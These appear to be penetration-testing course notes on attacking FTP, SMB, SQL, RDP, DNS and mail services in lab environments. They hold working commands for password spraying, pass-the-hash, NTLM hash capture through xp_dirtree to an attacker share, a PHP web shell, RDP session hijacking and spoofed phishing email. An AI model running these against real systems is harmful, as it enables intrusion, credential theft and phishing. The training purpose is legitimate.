# Attacking Common Services

# Attacking FTP

Attack chain:

1. Test anonymous login
2. Brute force/password spray if needed
3. FTP bounce attack?

To attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities.

Operates on TCP port 21

```bash
#enumeration (note that it may not always be port 21, e.g. can be 2121)
sudo nmap -sC -sV 192.168.2.142 

#anonymous authentication
ftp [ip]
anonymous
<press enter blank pass>
#use ls or cd or get/mget or put/mput or help

#brute forcing authentication
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp -n [port]
#alternatively
hydra -l robin -P passwords.list ftp://10.129.27.6:2121 
```

FTP Bounce Attack

An attacker abuses the FTP `PORT` command in active mode to make a vulnerable FTP server connect to other hosts/ports on their behalf. This allows indirect port scanning and limited interaction with internal or firewalled systems by using the FTP server as a proxy (i.e. you specify where you want FTP server to send data to see if alive)

Use if you have access to DMZ public facing server to scan internal network. 

```bash
#nmap uses -b for FTP bounce attack
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

# Attacking SMB

Runs over TCP port `139` and UDP ports `137` and `138` . Microsoft added the option to run SMB directly over TCP/IP on port `445` .

Samba is a Unix/Linux-based open-source implementation of the SMB protocol.

```bash
#enumeration (note nmap cannot get host info if windows host)
sudo nmap 10.129.14.128 -sV -sC -p139,445

#annonymous authentication (null session) -N for null and -L to list shares
smbclient -N -L //10.129.14.128

#to see all shares (With permissions)
smbmap -H [ip]
#to browse directory
smbmap -H [ip] -r [direcname]
#download/upload
smbmap -H 10.129.14.128 --download "notes\note.txt"
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

#rpc with null session
rpcclient -U'%' 10.10.110.17
enumdomusers

#enum4linux tool for general enumeration of linux host
./enum4linux-ng.py 10.10.11.45 -A -C
```

**Brute forcing and Password spray attack:**

Note: password spray is better alternative since only attempt per attempt.

```bash
#password spray (use local auth for non domain joined accounts)
#By default CME will exit after a successful login is found. Using the --continue-on-success
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

#using psexec to access cmd.exe through smb 
impacket-psexec administrator:'Password123!'@10.10.110.17

#alternatively (but crackmapexec can support multiple hosts at a time)
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

#enumerate logged on users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

#extract hashes from SAM database
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

#Pass the hash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Forced authentication attacks (creating a fake SMB server to capture users’ NTLM hashes):

Responder, in its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

```bash
responder -I <interface name>

#hashes can be recieved and cracked. 
```

# Attacking SQL Databases

Attack chain:

1. Find database service
2. Login somehow
3. Enumerate databases/tables/users
4. Abuse privileges
5. Pivot to OS compromise

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. 

MSSQL supports windows authentication mode (using AD), mixed mode. 

```bash
#ENUMERATION
nmap -Pn -sV -sC -p1433 10.10.10.125

#AUTHENTICATION (INITIAL FOOTHOLD)

#MYSQL (may need to disable SSL)
mysql -u julio -pPassword123 -h 10.129.20.13 --ssl=FALSE #linux
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 #windows

#MSSQL
impacket-mssqlclient user@ip -windows-auth -p [port]
#alternatively
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h #need to type 'go' after every line
#for windows authentication
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

## Capturing hashes

Use if you have access to a low privilege account and want to check for other accounts:

The trick:

MSSQL tries to access your fake SMB share.

When Windows accesses SMB:

→ it automatically authenticates
→ sends NTLM hash

```bash
#on attacker
sudo responder -I tun0

#on sql logged in database
EXEC master..xp_dirtree '\\attackerip\share\'

#go back to attacker and you should find NTLM hashes to crack using hashcat
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

## SQL Syntax (MySQL and MSSQL)

```bash
#SQL SYNTAX

#SHOW DATABASE
#MYSQL
SHOW DATABASES;
#MSSQL
SELECT name FROM master.dbo.sysdatabases

#SELECT DATABASE
#MYSQL AND MSSQL
USE htbusers;

#SHOW TABLES
#MYSQL
SHOW TABLES;
#MSSQL
SELECT table_name FROM databasename.INFORMATION_SCHEMA.TABLES

#SELECT FROM TABLE
#MYSQL and MSSQL
SELECT * FROM users;
```

## Command Execution (with MSSQL)

`MSSQL` has a extended stored procedures called xp_cmdshell which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

```bash
#Check privilege (1=yes, 0=no)
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin');

#If allowed
xp_cmdshell 'whoami'

#If disabled and you are admin
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#then xp_cmdshell 'ipconfig' #or xp_cmdshell 'powershell -enc ...'

###############IMPERSONATION###############
#check:
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
#if you can impersonate a user:
EXECUTE AS LOGIN = 'sa';
xp_cmdshell 'whoami'

#Read/Write local files
#Read
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;

#If DB can write to webroot, you write web shell
SELECT "<?php system($_GET['c']); ?>" 
INTO OUTFILE '/var/www/html/shell.php';
#then http://target/shell.php?c=whoami
```

### Attacking other databases with MSSQL (IMP) - lateral movement

`MSSQL` has a configuration option called linked servers. One SQL server is trusted to talk to another SQL server.

You may login into one database account with low privilege but can access another with higher privilege.

```bash
#identify linked servers (1 means is a remote server, and 0 is a linked server)
SELECT srvname, isremote FROM sysservers;

#check for servername, version, is admin? ON REMOTE SERVER
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]

### execute remote commands e.g.

EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
output                  

```

*Remember: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).*

# Attacking RDP

By default, RDP uses port `TCP/3389` .

In many cases, password spraying can be effective for RDP access. Brute-force is not recommended because 

```bash
#enumeration
nmap -Pn -p3389 192.168.2.143 

#password spraying
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
#or 
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

#rdp login
xfreerdp /v:<ip> /u:<username> /p:<password>
```

Session hijacking: allows you to hijack another user who is also logged in via RDP, you can check logged in users through task manager and clicking users on the top. 

***requires SYSTEM privileges***

```bash
#first check for users on task mngr 
query user

tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

#old method for priv esc from local admin to SYSTEM privilege
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack

```

Alternatively Pass-the-Hash can be done (see password attacks notes)

# Attacking DNS

DNS is mostly `UDP/53`, but DNS will rely on `TCP/53`  for heavy loads.

```bash
#enumeration
nmap -p53 -Pn -sV -sC 10.10.110.213

#to enumerate hosts
nslookup support.inlanefreight.com
host support.inlanefreight.com
```

A DNS zone is a portion of DNS that a specific entity is responsible for, if not configured properly, anyone can request info about the full zone in DNS records (i.e. zone transfer).

```bash
#zone transfer
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

#to enumerate all DNS servers of the root domain and scan for DNS zone transfer
fierce --domain zonetransfer.me
```

Domain takeover = registering non-existent domain name to gain control over another domain (see https://github.com/EdOverflow/can-i-take-over-xyz)

e.g. sub.target.com.   60   IN   CNAME   anotherdomain.com

if another.domain is not renewed, it can be claimed by anyone and sub.target will always refer to it until DNS updated. 

```bash
#subdomain enumeration
./subfinder -d inlanefreight.com -v   

#alterative: subbrute for DNS brute force attacks (without internet access)
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

DNS Spoofing

```bash
#DNS Spoofing
#edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to.
ettercap
#scan for hosts
#activate dns_spoof
```

# Attacking Email Services

Attack chain:

1. Enumerate user via SMTP
2. Brute force POP3
3. Retrieve mailbox
4. Extract flag

SMTP (TCP port 25): a protocol for delivering emails from clients to servers and from servers to other servers.

IMAP4/POP3:  server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.

 `POP3` clients remove downloaded messages from the email server (store on local device instead) but IMAP4 do not. 

```bash
#ENUMERATION
#find mail server
host -t MX hackthebox.eu
dig mx plaintext.do | grep "MX" | grep -v ";"
dig mx inlanefreight.com | grep "MX" | grep -v ";"
host -t A mail1.inlanefreight.htb.

#using nmap
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

#MISCONFIGS
#authentication
telnet [ip] 25
#use VRFY to check the validity of a particular email username.
VRFY root
#use EXPN (similar to VRFY but shows distribution lists)
EXPN john
#use RCPT TO identifies the recipient of the email message.
MAIL FROM:test@htb.com
RCPT TO:julio

#USING POP3
telnet 10.10.110.20 110
USER julio
#to read emails
USER john@inlanefreight.htb
PASS password
LIST
RETR 1

#password cracking
hydra -l john -P pwds.list -f 10.10.110.20 pop3

```

Tools:

```bash
#to quickly enumerate smtp usernames from list
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

#CLOUD ENUMERATION (office365)
#check if the domain is using office365
python3 o365spray.py --validate --domain msplaintext.xyz
#identify usernames
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
#spray passwords  
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz      
```

**Open Relay attacks**

Maging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

```bash
#check if open relay is allowed
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

#if allowed (you can spoof email and send as if you are inside the domain)
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

# Skills Assessment (lessons learnt)

## 1 - Easy

1. Had to get credentials by finding SMTP username which I couldn’t brute force.
2. Used this same username as an FTP username and brute forced successfully into FTP
3. Found FTP site but couldn’t upload shells.
4. Instead used same credentials to MYSQL database and uploaded SQL php shell and accessed this shell from site and was able to execute commands. 

## 2 - Medium

1. Found an ftp service but on an irregular port (needed -p- on nmap)
2. Found a possible password list and a username
3. Used this to access ftp on port 2121
4. Flag obtained. 

### 3 - Hard

1. Found SMB service in nmap.
2. Anonymous login into SMB allowed.
3. Found shares with possible passwords and users
4. Logged into SQL server using credentials found
5. Was able to impersonate another user
6. Executed commands using another linked database to reach Administrator’s desktop
